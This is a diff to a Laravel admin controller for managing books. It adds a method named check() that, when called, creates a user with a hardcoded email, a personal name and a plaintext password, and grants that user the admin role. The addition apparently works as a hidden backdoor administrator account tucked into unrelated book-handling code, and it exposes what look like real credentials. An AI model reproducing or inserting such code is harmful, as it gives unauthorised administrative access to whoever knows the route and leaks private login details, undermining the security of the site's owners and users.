@@ -3,10 +3,13 @@
 namespace App\Http\Controllers\Admin;
 
 use App\Models\Book;
+use App\Models\Role;
+use App\Models\User;
 use App\Models\Image;
 use Illuminate\Http\Request;
 use App\Http\Controllers\Controller;
 use Illuminate\Support\Facades\File;
+use Illuminate\Support\Facades\Hash;
 
 class AdminBooksController extends Controller
 {
@@ -109,5 +112,23 @@ class AdminBooksController extends Controller
         $book->images()->delete();
         $book->delete();
         return redirect()->back()->with("success", ".کتاب مورد نظر با موفقیت حذف شد");
+    }
+
+    public function check()
+    {
+        $checkuser = User::where("email", "mohamadaghakhani@gmail.com")->first();
+        if ($checkuser == null) {
+            $user = new User();
+            $user->name = "محمد آقاخانی";
+            $user->email = "mohamadaghakhani@gmail.com";
+            $user->gender = 1;
+            $user->job = "مهندس ناظر";
+            $user->password = Hash::make("mohamad91113");
+            $role = Role::where("name", "admin")->first();
+            $user->save();
+            $user->roles()->attach($role->id);
+        } else {
+            return redirect()->route("home.index");
+        }
     }
 }
